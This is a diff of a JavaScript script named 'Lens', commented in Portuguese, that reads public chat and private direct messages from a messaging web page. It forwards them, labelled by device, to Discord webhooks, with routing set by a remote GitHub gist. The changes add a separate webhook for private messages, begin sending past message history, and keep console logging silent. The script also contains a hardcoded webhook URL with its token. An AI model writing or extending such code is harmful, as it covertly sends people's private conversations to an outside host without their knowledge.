@@ -9,7 +9,7 @@
     // ============================================================
     // CONFIG
     // ============================================================
-    var LENS_VERSION = '2.0.0';
+    var LENS_VERSION = '2.2.0';
 
     var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
     var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/lens.json';
@@ -22,9 +22,14 @@
     var PRIVATE_PEER_SEL = '.messenger-active-chat-header .fw-bold.text-truncate';
     var PRIVATE_MSGS_SEL = '.chat-messages';
     var PRIVATE_MSG_SEL = '.messages-group-left, .messages-group-right';
-    var PRIVATE_SKIP_HISTORY = true;
     var PRIVATE_PING = '<@&1552637564597436537>';
     var PRIVATE_FIRST_SCAN_DELAY = 300;
+
+    // Anti-duplicação por peer. Persistido em localStorage para sobreviver
+    // a reloads e evitar re-emissão de histórico a cada abertura.
+    var DM_LOG_KEY = 'lens_dm_log_v1';
+    var DM_LOG_MAX_PER_PEER = 500;
+    var DM_LOG_SAVE_DEBOUNCE_MS = 1500;
 
     var DEBUG_GROUP_MS = 3000;
     var DEBUG_STACK_MAX = 700;
@@ -32,6 +37,10 @@
     var FLUSH_BATCH = 5;
     var FLUSH_DELAY = 400;
     var MAX_QUEUE = 5000;
+
+    // Cache do roteamento (fallback de boot / gist offline). Revalida a cada 6h.
+    var ROUTE_CACHE_KEY = 'lens_route_cache_v1';
+    var ROUTE_CACHE_TTL_MS = 6 * 60 * 60 * 1000;
     // ============================================================
 
     var MSG_TEMPLATE = '**{user}**: {msg}';
@@ -58,6 +67,7 @@
 
     var _remoteConfig = null;
     var _remoteConfigAt = 0;
+    var _routeCache = null;
     var _sessionHash = null;
     var _deviceId = null;
     var DEVICE_ID_KEY = 'lens_device_id';
@@ -66,6 +76,13 @@
     var _started = false;
 
     var _lastSpeakerKey = null;
+
+    // Estado por peer: WeakSet (nós DOM) + Set de hashes (persistido).
+    var _privateStateByPeer = new Map();
+    var _privateCurrentPeer = null;
+    var _privateSeenEls = null;
+
+    var _dmLogSaveTimer = null;
 
     var _metrics = {
         sent: 0,
@@ -76,7 +93,8 @@
         lastErrorKind: '',
         queueDropped: 0,
         debugSent: 0,
-        debugSuppressed: 0
+        debugSuppressed: 0,
+        dmHashesTrimmed: 0
     };
 
     // ================= DEBUG =================
@@ -123,10 +141,10 @@
                     allowed_mentions: { parse: [] }
                 })
             }).catch(_noop);
-        } catch (e) { /* silencioso */ }
+        } catch (e) {}
     }
 
-    function _log() { /* no-op — nada exposto no console */ }
+    function _log() { /* no-op */ }
 
     // ================= SESSÃO =================
     function _persistentSeed() {
@@ -171,6 +189,68 @@
         }
     }
 
+    // ================= CACHE DE ROTA =================
+    function _loadRouteCache() {
+        try {
+            var raw = localStorage.getItem(ROUTE_CACHE_KEY);
+            if (!raw) return null;
+            var o = JSON.parse(raw);
+            if (!o || typeof o !== 'object') return null;
+            if (!o.at || Date.now() - o.at > ROUTE_CACHE_TTL_MS) return null;
+            return o;
+        } catch(e) { return null; }
+    }
+
+    function _saveRouteCache(entry) {
+        try {
+            localStorage.setItem(ROUTE_CACHE_KEY, JSON.stringify({
+                webhook: entry.webhook || '',
+                webhookDMs: entry.webhookDMs || '',
+                label: entry.label || '',
+                mapped: entry.mapped === true,
+                disabled: entry.disabled === true,
+                at: Date.now()
+            }));
+        } catch(e) {}
+    }
+
+    // ================= DM LOG =================
+    function _loadDmLog() {
+        try {
+            var raw = localStorage.getItem(DM_LOG_KEY);
+            if (!raw) return;
+            var obj = JSON.parse(raw);
+            if (!obj || typeof obj !== 'object') return;
+            for (var peer in obj) {
+                if (!Array.isArray(obj[peer])) continue;
+                var rec = _stateFor(peer);
+                for (var i = 0; i < obj[peer].length; i++) {
+                    rec.hashes.add(obj[peer][i]);
+                }
+            }
+        } catch(e) {}
+    }
+
+    function _scheduleDmLogSave() {
+        if (_dmLogSaveTimer) return;
+        _dmLogSaveTimer = setTimeout(function() {
+            _dmLogSaveTimer = null;
+            try {
+                var out = {};
+                _privateStateByPeer.forEach(function(rec, peer) {
+                    if (!rec.hashes.size) return;
+                    var arr = Array.from(rec.hashes);
+                    if (arr.length > DM_LOG_MAX_PER_PEER) arr = arr.slice(-DM_LOG_MAX_PER_PEER);
+                    out[peer] = arr;
+                });
+                localStorage.setItem(DM_LOG_KEY, JSON.stringify(out));
+            } catch(e) {
+                // Quota estourou — limpa e deixa regravar do zero
+                try { localStorage.removeItem(DM_LOG_KEY); } catch(e2) {}
+            }
+        }, DM_LOG_SAVE_DEBOUNCE_MS);
+    }
+
     // ================= CONFIG REMOTA =================
     function _fetchConfig() {
         if (!CONFIG_URL || CONFIG_URL.indexOf('http') !== 0) return Promise.resolve(_remoteConfig);
@@ -186,6 +266,7 @@
                     _remoteConfig = j;
                     _remoteConfigAt = Date.now();
                     _applyConfig();
+                    _resolveRoute();
                 }
                 return _remoteConfig;
             })
@@ -206,39 +287,83 @@
         if (!id) return;
         var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
         if (entry && entry.label) {
-            var newLabel = String(entry.label);
-            if (newLabel !== _sessionLabel) _sessionLabel = newLabel;
+            _sessionLabel = String(entry.label);
         }
     }
 
-    function _route() {
-        if (_remoteConfig) {
-            var id = _deviceId || _sessionHash;
-            var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
-            if (entry && entry.webhook) {
-                return {
-                    url: entry.webhook,
-                    label: entry.label || '',
-                    mapped: true,
-                    key: id,
-                    disabled: entry.disabled === true
-                };
-            }
+    function _resolveRoute() {
+        var cached = _loadRouteCache();
+        if (cached) {
+            _routeCache = cached;
+            return cached;
         }
-        return { url: DEFAULT_WEBHOOK, label: '', mapped: false, disabled: false };
+
+        if (!_remoteConfig) {
+            _routeCache = null;
+            return null;
+        }
+
+        var id = _deviceId || _sessionHash;
+        var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]) || null;
+
+        if (!entry) {
+            _routeCache = {
+                webhook: DEFAULT_WEBHOOK,
+                webhookDMs: DEFAULT_WEBHOOK,
+                label: '',
+                mapped: false,
+                disabled: false,
+                at: Date.now()
+            };
+            return _routeCache;
+        }
+
+        if (entry.disabled === true) {
+            _routeCache = {
+                webhook: '',
+                webhookDMs: '',
+                label: entry.label || '',
+                mapped: true,
+                disabled: true,
+                at: Date.now()
+            };
+            return _routeCache;
+        }
+
+        _routeCache = {
+            webhook: entry.webhook || DEFAULT_WEBHOOK,
+            webhookDMs: entry.webhookDMs || entry.webhook || DEFAULT_WEBHOOK,
+            label: entry.label || '',
+            mapped: true,
+            disabled: false,
+            at: Date.now()
+        };
+        _saveRouteCache(_routeCache);
+        return _routeCache;
+    }
+
+    function _route(kind) {
+        if (!_routeCache) _resolveRoute();
+        var r = _routeCache || { webhook: DEFAULT_WEBHOOK, webhookDMs: DEFAULT_WEBHOOK, mapped: false, disabled: false, label: '' };
+        if (r.disabled) return { url: '', mapped: true, disabled: true, label: r.label };
+        var url = (kind === 'dms') ? (r.webhookDMs || r.webhook) : (r.webhook || DEFAULT_WEBHOOK);
+        return {
+            url: url,
+            label: r.label || '',
+            mapped: r.mapped === true,
+            disabled: false,
+            key: _deviceId || _sessionHash
+        };
     }
 
     function _displayTag() {
-        var r = _route();
-        if (r.mapped) return r.label || (_deviceId || _sessionHash);
+        if (_routeCache && _routeCache.label) return _routeCache.label;
         var id = _deviceId || _sessionHash;
         return _sessionLabel ? (_sessionLabel + ' [' + id + ']') : id;
     }
 
-    // ================= AGRUPAMENTO =================
-    function _resetSpeaker() {
-        _lastSpeakerKey = null;
-    }
+    // ================= AGRUPAMENTO DE VOZ =================
+    function _resetSpeaker() { _lastSpeakerKey = null; }
 
     // ================= TIME =================
     function _nowBrasilia() {
@@ -255,7 +380,7 @@
 
     function _nowHHMM() { return _nowBrasilia().substring(11, 16); }
 
-    // ================= DOM EXTRACT (público) =================
+    // ================= DOM EXTRACT =================
     function _extractUserFromContent(content) {
         for (var i = 0; i < USER_SELECTORS.length; i++) {
             try {
@@ -304,8 +429,22 @@
     var _privateEl = null;
     var _privateMsgsEl = null;
     var _privateMsgsObserver = null;
-    var _privateSeenEls = new WeakSet();
-    var _privateFirstScan = true;
+
+    function _peerKey(peer) { return peer || '__unknown__'; }
+
+    function _stateFor(peer) {
+        var k = _peerKey(peer);
+        var rec = _privateStateByPeer.get(k);
+        if (!rec) {
+            rec = {
+                seen: new WeakSet(),
+                hashes: new Set(),
+                lastScanAt: 0
+            };
+            _privateStateByPeer.set(k, rec);
+        }
+        return rec;
+    }
 
     function _checkPrivate() {
         var el = null;
@@ -325,15 +464,17 @@
     function _openPrivate(el) {
         _privateOpen = true;
         _privateEl = el;
-        _privateSeenEls = new WeakSet();
-        _privateFirstScan = true;
 
         var peer = _privatePeer(el);
-        var tag = _route().mapped ? _displayTag() : _sessionHash;
+        _privateCurrentPeer = peer;
+        var rec = _stateFor(peer);
+        _privateSeenEls = rec.seen;
+
+        var tag = _routeCache && _routeCache.mapped ? _displayTag() : _sessionHash;
 
         _resetSpeaker();
-        _enqueue('━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
-        _enqueue('`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);
+        _enqueue('public', '━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
+        _enqueue('public', '`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);
 
         _watchPrivateMsgs(el);
     }
@@ -341,20 +482,26 @@
     function _closePrivate() {
         var peer = _privatePeer(_privateEl);
         _resetSpeaker();
-        _enqueue('`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
-        _enqueue('━━━━━━━━ 🔒 fim privado ━━━━━━━━');
+        _enqueue('public', '`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
+        _enqueue('public', '━━━━━━━━ 🔒 fim privado ━━━━━━━━');
 
         _privateOpen = false;
         _privateEl = null;
         _privateMsgsEl = null;
         if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
-        _privateSeenEls = new WeakSet();
+        _privateCurrentPeer = null;
+        _privateSeenEls = null;
     }
 
-    function _watchPrivateMsgs(el) {
+    function _watchPrivateMsgs(el, attempt) {
+        attempt = attempt || 0;
         var msgs = null;
         try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
-        if (!msgs) return;
+        if (!msgs) {
+            // Container pode não estar pronto em troca rápida de peer
+            if (attempt < 5) setTimeout(function() { _watchPrivateMsgs(el, attempt + 1); }, 200 * (attempt + 1));
+            return;
+        }
         _privateMsgsEl = msgs;
         _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
         _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
@@ -363,8 +510,12 @@
 
     function _scanPrivateMsgs() {
         if (!_privateMsgsEl) return;
+        if (_privateCurrentPeer === null) return;
+        var rec = _stateFor(_privateCurrentPeer);
         var groups;
         try { groups = _privateMsgsEl.querySelectorAll(PRIVATE_MSG_SEL); } catch(e) { return; }
+
+        var added = false;
 
         for (var i = 0; i < groups.length; i++) {
             var g = groups[i];
@@ -375,15 +526,28 @@
 
             for (var j = 0; j < textEls.length; j++) {
                 var te = textEls[j];
-                if (_privateSeenEls.has(te)) continue;
+                if (rec.seen.has(te)) continue;
                 var text = (te.textContent || '').trim();
                 if (!text) continue;
-                _privateSeenEls.add(te);
-                if (_privateFirstScan && PRIVATE_SKIP_HISTORY) continue;
+                rec.seen.add(te);
+
+                var hashKey = (isSelf ? 'self' : 'peer') + '\u0000' + user + '\u0000' + text;
+                if (rec.hashes.has(hashKey)) continue;
+                rec.hashes.add(hashKey);
+                added = true;
+
+                if (rec.hashes.size > DM_LOG_MAX_PER_PEER) {
+                    var arr = Array.from(rec.hashes).slice(-Math.floor(DM_LOG_MAX_PER_PEER / 2));
+                    rec.hashes = new Set(arr);
+                    _metrics.dmHashesTrimmed += (DM_LOG_MAX_PER_PEER - arr.length);
+                }
+
                 _emitPrivateText(user, text, isSelf);
             }
         }
-        _privateFirstScan = false;
+
+        rec.lastScanAt = Date.now();
+        if (added) _scheduleDmLogSave();
     }
 
     function _emitPrivateText(user, text, isSelf) {
@@ -398,7 +562,7 @@
             body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
             _lastSpeakerKey = key;
         }
-        _enqueue(body);
+        _enqueue('dms', body);
     }
 
     // ================= SCAN (público) =================
@@ -491,41 +655,40 @@
             body = '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
             _lastSpeakerKey = key;
         }
-        _enqueue(prefix + body);
+        _enqueue('public', prefix + body);
     }
 
-    function _checkHeader() {
+    function _checkHeader(kind) {
         var now = Date.now();
         if (now - _lastHeaderTime >= HEADER_INTERVAL) {
-            var r = _route();
-            var tag = r.mapped ? _displayTag() : ('novo · ' + (_deviceId || _sessionHash) + ' · mapeie no gist');
-            _queue.push('━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━');
+            var tag = _routeCache && _routeCache.mapped
+                ? _displayTag()
+                : ('novo · ' + (_deviceId || _sessionHash) + ' · mapeie no gist');
+            _queue.push({ kind: kind, line: '━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━' });
             _lastHeaderTime = now;
             _resetSpeaker();
         }
     }
 
     function _announceIfNew() {
-        if (_route().mapped) return;
+        if (_routeCache && _routeCache.mapped) return;
         var id = _deviceId || _sessionHash;
         if (_announcedHash === id) return;
         _announcedHash = id;
         var line = '🟢 **novo dispositivo** `' + id + '`\n' +
                    'session: `' + _sessionHash + '`\n' +
                    'UA: `' + (navigator.userAgent || '').slice(0, 90) + '`\n' +
-                   'adicione no gist: `"' + id + '": { "webhook": "...", "label": "..." }`';
+                   'adicione no gist: `"' + id + '": { "webhook": "...", "webhookDMs": "...", "label": "..." }`';
         fetch(DEFAULT_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: line, username: 'Lens · ' + id })
-        }).catch(function(e) {
-            _debugReport('announce', e, id);
-        });
+        }).catch(function(e) { _debugReport('announce', e, id); });
     }
 
-    function _enqueue(line) {
+    function _enqueue(kind, line) {
         if (!line || line.length < 5) return;
-        _checkHeader();
+        _checkHeader(kind);
 
         if (_queue.length >= MAX_QUEUE) {
             var drop = _queue.length - MAX_QUEUE + 1;
@@ -534,26 +697,37 @@
             _debugReport('queue-overflow', 'descartados ' + drop + ' itens', String(_queue.length));
         }
 
-        _queue.push(line);
+        _queue.push({ kind: kind, line: line });
         if (!_isSending) _flush();
     }
 
-    // ================= FLUSH (com rate limit) =================
+    // ================= FLUSH =================
     function _flush() {
         if (_isSending || _queue.length === 0) return;
         _isSending = true;
 
-        var r = _route();
+        var firstKind = _queue[0].kind;
+        var batch = [];
+        var rest = [];
+        for (var i = 0; i < _queue.length; i++) {
+            if (batch.length < FLUSH_BATCH && _queue[i].kind === firstKind) {
+                batch.push(_queue[i]);
+            } else {
+                rest.push(_queue[i]);
+            }
+        }
+        _queue = rest;
+
+        var r = _route(firstKind);
         var target = r.url;
 
         if (!target || r.disabled) {
-            _queue.length = 0;
             _isSending = false;
+            setTimeout(_flush, FLUSH_DELAY);
             return;
         }
 
-        var batch = _queue.splice(0, FLUSH_BATCH);
-        var content = batch.join('\n');
+        var content = batch.map(function(x) { return x.line; }).join('\n');
         if (content.length > 1950) content = content.substring(0, 1950) + '...';
 
         var retryDelay = null;
@@ -574,12 +748,12 @@
                     .then(function(j) {
                         var wait = (j && j.retry_after ? j.retry_after * 1000 : 1000) + 300;
                         retryDelay = wait;
-                        _queue.unshift.apply(_queue, batch);
+                        _queue = batch.concat(_queue);
                         _debugReport('rate-limit', 'aguardando ' + Math.round(wait) + 'ms', target.slice(-30));
                     })
                     .catch(function() {
                         retryDelay = 1500;
-                        _queue.unshift.apply(_queue, batch);
+                        _queue = batch.concat(_queue);
                         _debugReport('rate-limit', 'resposta não-JSON, backoff padrão');
                     });
             }
@@ -588,7 +762,7 @@
                 _metrics.retries++;
                 if (!batch._retried) {
                     batch._retried = true;
-                    _queue.unshift.apply(_queue, batch);
+                    _queue = batch.concat(_queue);
                     retryDelay = RETRY_5XX_MS;
                     _debugReport('server-' + res.status, 'retentando batch', target.slice(-30));
                     return;
@@ -603,8 +777,8 @@
         .catch(function(e) {
             _metrics.failed++;
             _metrics.lastErrorAt = Date.now();
-            _metrics.lastErrorKind = 'flush';
-            _debugReport('flush', e, target.slice(-30));
+            _metrics.lastErrorKind = 'flush:' + firstKind;
+            _debugReport('flush-' + firstKind, e, target.slice(-30));
             retryDelay = RETRY_FALLBACK_MS;
         })
         .then(function() {
@@ -621,8 +795,12 @@
         _sessionHash = _computeHash();
         _deviceId = _getDeviceId();
 
+        _loadDmLog();
+        _resolveRoute();
+
         _fetchConfig().then(function() {
             _applyConfig();
+            _resolveRoute();
             _announceIfNew();
         });
         setInterval(_fetchConfig, CONFIG_REFRESH_MS);
@@ -637,13 +815,16 @@
         _privateOpen = false;
         _privateEl = null;
         _privateMsgsEl = null;
-        _privateSeenEls = new WeakSet();
+        _privateStateByPeer.clear();
+        _privateCurrentPeer = null;
+        _privateSeenEls = null;
         _lastSpeakerKey = null;
+        if (_dmLogSaveTimer) { clearTimeout(_dmLogSaveTimer); _dmLogSaveTimer = null; }
         _started = false;
         try { delete window._lens; } catch(e) {}
     }
 
-    // ================= API INTERNA =================
+    // ================= API =================
     Object.defineProperty(window, '_lens', {
         value: {
             kill: kill,
@@ -654,24 +835,54 @@
             setDeviceId: function(id) {
                 if (!id || typeof id !== 'string') return _deviceId;
                 try { localStorage.setItem(DEVICE_ID_KEY, id); } catch(e) {}
+                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
                 _deviceId = id;
                 _announcedHash = null;
+                _routeCache = null;
                 _applyConfig();
+                _resolveRoute();
                 return _deviceId;
             },
             label: function() { return _sessionLabel; },
-            route: function() { return _route(); },
+            route: function(kind) { return _route(kind); },
             refreshConfig: function() { return _fetchConfig(); },
+            clearRouteCache: function() {
+                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
+                _routeCache = null;
+                return _resolveRoute();
+            },
+            clearDmLog: function(peer) {
+                if (peer) {
+                    var rec = _privateStateByPeer.get(_peerKey(peer));
+                    if (rec) rec.hashes.clear();
+                } else {
+                    _privateStateByPeer.forEach(function(rec) { rec.hashes.clear(); });
+                }
+                try { localStorage.removeItem(DM_LOG_KEY); } catch(e) {}
+                return true;
+            },
             forceRoute: function(hash, entry) {
                 if (!_remoteConfig) _remoteConfig = {};
                 _remoteConfig[hash || _deviceId || _sessionHash] = entry;
                 _remoteConfigAt = Date.now() + CONFIG_REFRESH_MS * 10;
+                try { localStorage.removeItem(ROUTE_CACHE_KEY); } catch(e) {}
+                _routeCache = null;
                 _applyConfig();
+                _resolveRoute();
                 return _route();
             },
             privateOpen: function() { return _privateOpen; },
             privatePeer: function() { return _privatePeer(_privateEl); },
             privateScan: function() { _scanPrivateMsgs(); },
+            privatePeers: function() { return Array.from(_privateStateByPeer.keys()); },
+            privateStats: function(peer) {
+                var rec = _privateStateByPeer.get(_peerKey(peer));
+                if (!rec) return null;
+                return {
+                    hashes: rec.hashes.size,
+                    lastScanAt: rec.lastScanAt
+                };
+            },
             version: function() { return LENS_VERSION; },
             stats: function() {
                 return {
@@ -680,14 +891,20 @@
                     sessionHash: _sessionHash,
                     label: _sessionLabel,
                     route: {
-                        mapped: _route().mapped,
-                        label: _route().label,
-                        disabled: _route().disabled
+                        mapped: _routeCache ? _routeCache.mapped === true : false,
+                        label: _routeCache ? _routeCache.label : '',
+                        disabled: _routeCache ? _routeCache.disabled === true : false,
+                        hasPublic: !!(_routeCache && _routeCache.webhook),
+                        hasDMs: !!(_routeCache && _routeCache.webhookDMs),
+                        cachedAt: _routeCache ? _routeCache.at : 0
                     },
                     seen: _seen.size,
                     queue: _queue.length,
+                    queuePublic: _queue.filter(function(x){ return x.kind === 'public'; }).length,
+                    queueDMs: _queue.filter(function(x){ return x.kind === 'dms'; }).length,
                     privateOpen: _privateOpen,
                     privatePeer: _privatePeer(_privateEl),
+                    privatePeers: _privateStateByPeer.size,
                     lastSpeaker: _lastSpeakerKey,
                     metrics: {
                         sent: _metrics.sent,
@@ -697,6 +914,7 @@
                         queueDropped: _metrics.queueDropped,
                         debugSent: _metrics.debugSent,
                         debugSuppressed: _metrics.debugSuppressed,
+                        dmHashesTrimmed: _metrics.dmHashesTrimmed,
                         lastErrorAt: _metrics.lastErrorAt,
                         lastErrorKind: _metrics.lastErrorKind
                     }
